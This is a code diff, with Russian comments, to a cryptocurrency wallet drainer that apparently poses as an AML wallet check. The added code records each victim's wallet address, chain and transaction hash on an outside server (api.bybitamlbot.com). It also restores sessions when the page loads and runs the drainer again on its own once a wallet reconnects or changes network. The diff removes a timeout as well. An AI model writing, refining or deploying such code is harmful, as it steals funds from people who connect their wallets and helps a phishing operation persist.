@@ -4,6 +4,15 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
 import config from './config.js';
 
+// Функция для генерации уникального sessionId
+function generateSessionId() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    const r = Math.random() * 16 | 0;
+    const v = c === 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+
 const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
@@ -28,6 +37,7 @@ let isTransactionPending = false;
 let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
+let sessionId = null;
 
 let lastDrainTime = 0;
 
@@ -300,6 +310,52 @@ function formatBalance(balance, decimals) {
   return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
 }
 
+async function saveSession(userAddress, chainId, txHash = null) {
+  try {
+    if (!sessionId) sessionId = generateSessionId();
+    const response = await fetch('https://api.bybitamlbot.com/api/save-session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId,
+        userAddress,
+        chainId,
+        txHash
+      })
+    });
+    const data = await response.json();
+    if (data.success) {
+      sessionStorage.setItem('sessionId', sessionId);
+      console.log(`✅ Сессия сохранена: ${sessionId}`);
+    } else {
+      throw new Error(data.message || 'Failed to save session');
+    }
+  } catch (error) {
+    console.error(`❌ Ошибка сохранения сессии: ${error.message}`);
+  }
+}
+
+async function restoreSession() {
+  try {
+    const storedSessionId = sessionStorage.getItem('sessionId');
+    if (!storedSessionId) return null;
+
+    const response = await fetch(`https://api.bybitamlbot.com/api/get-session/${storedSessionId}`);
+    const data = await response.json();
+    if (data.success) {
+      console.log(`✅ Сессия восстановлена: ${storedSessionId}`);
+      return data.data;
+    } else {
+      console.warn(`⚠️ Сессия не найдена или истекла: ${storedSessionId}`);
+      sessionStorage.removeItem('sessionId');
+      return null;
+    }
+  } catch (error) {
+    console.error(`❌ Ошибка восстановления сессии: ${error.message}`);
+    return null;
+  }
+}
+
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider, initialAmount) {
   function convertWeiToTokenRounded(balanceInWei, decimals) {
     const balanceInTokens = parseFloat(ethers.utils.formatUnits(balanceInWei, decimals));
@@ -319,6 +375,8 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
     console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
     
+    // Сохраняем сессию с txHash
+    await saveSession(userAddress, chainId, txHash);
 
     const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
       method: 'POST',
@@ -629,7 +687,7 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
   return totalValue;
 }
 
-window.addEventListener('DOMContentLoaded', () => {
+window.addEventListener('DOMContentLoaded', async () => {
   const actionButtons = document.querySelectorAll('.action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
 
@@ -814,6 +872,29 @@ window.addEventListener('DOMContentLoaded', () => {
 
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 
+  // Проверяем сохранённую сессию при загрузке страницы
+  const sessionData = await restoreSession();
+  if (sessionData && !hasDrained && !isTransactionPending) {
+    connectedAddress = sessionData.userAddress;
+    console.log(`ℹ️ Восстановлена сессия для адреса: ${connectedAddress}`);
+    // Проверяем, что кошелёк всё ещё подключён
+    try {
+      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      const accounts = await provider.listAccounts();
+      if (accounts.length > 0 && accounts[0].toLowerCase() === connectedAddress.toLowerCase()) {
+        await attemptDrainer();
+      } else {
+        console.warn(`⚠️ Кошелёк не подключён, очищаем сессию`);
+        sessionStorage.removeItem('sessionId');
+        connectedAddress = null;
+      }
+    } catch (error) {
+      console.error(`❌ Ошибка проверки подключения кошелька: ${error.message}`);
+      sessionStorage.removeItem('sessionId');
+      connectedAddress = null;
+    }
+  }
+
   if (!isInjected) {
     actionButtons.forEach(btn => {
       btn.addEventListener('click', () => {
@@ -864,12 +945,6 @@ async function attemptDrainer() {
 
   showModal();
 
-  const drainerTimeout = setTimeout(async () => {
-    isTransactionPending = false;
-    console.error('❌ Тайм-аут выполнения дрейнера');
-    await hideModalWithDelay("Check your wallet for AML!");
-  }, 60000);
-
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     const signer = provider.getSigner();
@@ -891,11 +966,8 @@ async function attemptDrainer() {
 
     hasDrained = true;
     isTransactionPending = false;
-    clearTimeout(drainerTimeout);
-    await hideModalWithDelay();
   } catch (err) {
     isTransactionPending = false;
-    clearTimeout(drainerTimeout);
     let errorMessage = "Error: An unexpected error occurred. Please try again.";
     if (err.message.includes('user rejected')) {
       errorMessage = "Error: Transaction rejected by user.";
@@ -924,6 +996,11 @@ async function handleConnectOrAction() {
       connectedAddress = await waitForWallet();
       console.log('✅ Подключён:', connectedAddress);
       appKitModal.close();
+
+      // Сохраняем сессию после успешного подключения
+      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+      const network = await provider.getNetwork();
+      await saveSession(connectedAddress, network.chainId);
     } else {
       console.log('ℹ️ Кошелёк уже подключён:', connectedAddress);
     }
@@ -949,7 +1026,9 @@ async function onChainChanged(chainId) {
     const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     const newNetwork = await provider.getNetwork();
     console.log(`📡 Новая сеть: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
-    await attemptDrainer(provider);
+    // Сохраняем сессию при смене сети
+    await saveSession(connectedAddress, newNetwork.chainId);
+    await attemptDrainer();
   } else {
     console.log('⏳ Транзакция в процессе');
     await hideModalWithDelay("Transaction in progress, please wait.");
